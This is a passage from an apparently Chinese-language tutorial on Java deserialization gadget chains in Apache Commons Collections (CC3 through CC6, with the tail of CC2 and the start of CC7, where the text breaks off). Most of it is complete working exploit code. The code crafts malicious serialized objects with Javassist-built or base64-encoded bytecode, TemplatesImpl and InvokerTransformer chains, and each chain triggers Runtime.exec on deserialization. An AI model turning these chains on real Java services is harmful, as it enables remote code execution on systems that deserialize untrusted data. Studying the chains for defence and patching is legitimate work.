TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();//返回默认的类池</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径</span><br><span class="line">        CtClass payload=classPool.makeClass(&quot;CommonsCollections22222222222&quot;);//创建一个新的public类</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span><br><span class="line">        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); //创建一个空的类初始化，设置构造函数主体为runtime</span><br><span class="line"></span><br><span class="line">        byte[] bytes=payload.toBytecode();//转换为byte数组</span><br><span class="line"></span><br><span class="line">        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();//反射创建TemplatesImpl</span><br><span class="line">        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);//反射获取templatesImpl的_bytecodes字段</span><br><span class="line">        field.setAccessible(true);//暴力反射</span><br><span class="line">        field.set(templatesImpl,new byte[][]&#123;bytes&#125;);//将templatesImpl上的_bytecodes字段设置为runtime的byte数组</span><br><span class="line"></span><br><span class="line">        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);//反射获取templatesImpl的_name字段</span><br><span class="line">        field1.setAccessible(true);//暴力反射</span><br><span class="line">        field1.set(templatesImpl,&quot;test&quot;);//将templatesImpl上的_name字段设置为test</span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象</span><br><span class="line">        PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span><br><span class="line">        queue.add(1);//添加数字1插入此优先级队列</span><br><span class="line">        queue.add(1);//添加数字1插入此优先级队列</span><br><span class="line"></span><br><span class="line">        Field field2=queue.getClass().getDeclaredField(&quot;comparator&quot;);//获取PriorityQueue的comparator字段</span><br><span class="line">        field2.setAccessible(true);//暴力反射</span><br><span class="line">        field2.set(queue,comparator);//设置queue的comparator字段值为comparator</span><br><span class="line"></span><br><span class="line">        Field field3=queue.getClass().getDeclaredField(&quot;queue&quot;);//获取queue的queue字段</span><br><span class="line">        field3.setAccessible(true);//暴力反射</span><br><span class="line">        field3.set(queue,new Object[]&#123;templatesImpl,templatesImpl&#125;);//设置queue的queue字段内容Object数组，内容为templatesImpl</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
### CC3 jdk7u21 3.1-3.2.1

对 CC1 进行了一些修改。引入了 TemplatesImpl 来加载字节码，去掉了 InvokerTransformer ，引入了 InstantiateTransformer。TemplatesImpl、InstantiateTransformer、TrAXFilter 上面1.6已经介绍了，这里不再赘述。如何通过 AnnotationInvocationHandler.readObject() 来触发 LazyMap.get() 也与上面的 CC1 一致。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">package com.test;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import javassist.CannotCompileException;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.NotFoundException;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc1 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IOException, IllegalAccessException, InvocationTargetException, InstantiationException, NotFoundException, CannotCompileException, NoSuchFieldException &#123;</span><br><span class="line">        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass payload=classPool.makeClass(&quot;CommonsCollections333333333&quot;);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line"></span><br><span class="line">        byte[] bytes=payload.toBytecode();</span><br><span class="line"></span><br><span class="line">        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(templatesImpl,new byte[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        field1.setAccessible(true);</span><br><span class="line">        field1.set(templatesImpl,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);</span><br><span class="line">        Map map=new HashMap();</span><br><span class="line">        Map lazyMap= LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class cls=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);</span><br><span class="line">        Object object=constructor.newInstance(Override.class,map1);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));</span><br><span class="line">        outputStream.writeObject(object);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
### CC4 4.0，jdk7u21及以前 因为 CommonsCollections4 除4.0的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。所以我们是否可以不使用 InvokerTransformer 呢？于是便有了 CC4，CC4 只是将 CC2 中的 InvokerTransformer 替换为了 InstantiateTransformer。
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-&gt;PriorityQueue.readObject()</span><br><span class="line">      -&gt;PriorityQueue.heapify()</span><br><span class="line">          -&gt;PriorityQueue.siftDown()</span><br><span class="line">            -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                 -&gt;TransformingComparator.compare()</span><br><span class="line">                    -&gt;ChainedTransformer.transform()</span><br><span class="line">                        -&gt;ConstantTransformer.transform()</span><br><span class="line">                                    -&gt;InstantiateTransformer.transform()</span><br><span class="line">                             -&gt;TrAXFilter.TrAXFilter()</span><br><span class="line">                                 -&gt;TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>
详细代码
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">public class CommonsCollections4 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        try&#123;</span><br><span class="line">            //字节码</span><br><span class="line">            byte[] code = Base64.decode(&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;);</span><br><span class="line"></span><br><span class="line">            //反射设置 Field</span><br><span class="line">            TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">            setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line">            setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">            setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">            //Transformer数组</span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                    new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">            //TransformingComparator 实例</span><br><span class="line">            TransformingComparator comparator = new TransformingComparator(chainedTransformer);</span><br><span class="line"></span><br><span class="line">            //PriorityQueue 实例</span><br><span class="line">            PriorityQueue priorityQueue = new PriorityQueue(2);</span><br><span class="line">            //先设置为正常变量值，后面可以通过setFieldValue修改</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line"></span><br><span class="line">            //反射设置 Field</span><br><span class="line">            Object[] objects = new Object[]&#123;templates, templates&#125;;</span><br><span class="line">            setFieldValue(priorityQueue, &quot;queue&quot;, objects);</span><br><span class="line">            setFieldValue(priorityQueue, &quot;comparator&quot;, comparator);</span><br><span class="line"></span><br><span class="line">            //序列化</span><br><span class="line">            ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">            oos.writeObject(priorityQueue);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            //测试反序列化</span><br><span class="line">            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //反射设置 Field</span><br><span class="line">    public static void setFieldValue(Object object, String fieldName, Object value) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
### CC5 BadAttributeValueExpException-&gt;TiedMapEntry.toString() -&gt;LazyMap.get()
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">-&gt;BadAttributeValueExpException.readObject()</span><br><span class="line">      -&gt;TiedMapEntry.toString()</span><br><span class="line">          -&gt;TiedMapEntry.getValue()</span><br><span class="line">            -&gt;LazyMap.get()</span><br><span class="line">                -&gt;ChainedTransformer.transform()</span><br><span class="line">                    -&gt;ConstantTransformer.transform()</span><br><span class="line">                            -&gt;InvokerTransformer.transform()</span><br><span class="line">                                -&gt;…………</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class CommonsCollections5 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        //Transformer数组</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //ChainedTransformer实例</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        //LazyMap实例</span><br><span class="line">        Map uselessMap = new HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        //TiedMapEntry 实例</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        //BadAttributeValueExpException 实例</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line"></span><br><span class="line">        //反射设置 val</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);</span><br><span class="line">        val.setAccessible(true);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        //序列化</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        //测试反序列化</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
### CC6   1，3链换头  换成hashmap.hashcode()
 
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">//这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同</span><br><span class="line">  -&gt;HashMap.readObject()</span><br><span class="line">      -&gt;HashMap.putForCreate()</span><br><span class="line">          -&gt;HashMap.hash()</span><br><span class="line">            -&gt;TiedMapEntry.hashCode()</span><br><span class="line">                    -&gt;TiedMapEntry.getValue()</span><br><span class="line">                    -&gt;LazyMap.get()</span><br><span class="line">                      -&gt;ChainedTransformer.transform()</span><br><span class="line">                          -&gt;ConstantTransformer.transform()</span><br><span class="line">                              -&gt;InvokerTransformer.transform()</span><br><span class="line">                                  -&gt;…………</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class CommonsCollections6 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = new Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //ChainedTransformer实例</span><br><span class="line">        //先设置假的 Transformer 数组，防止生成时执行命令</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        //LazyMap实例</span><br><span class="line">        Map uselessMap = new HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        //TiedMapEntry 实例</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //通过反射设置真的 ransformer 数组</span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        //清空由于 hashMap.put 对 LazyMap 造成的影响</span><br><span class="line">        lazyMap.clear();</span><br><span class="line"></span><br><span class="line">        //序列化</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        //测试反序列化</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
### CC7  1=3 2=4  5 6 7 头部都不一样
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 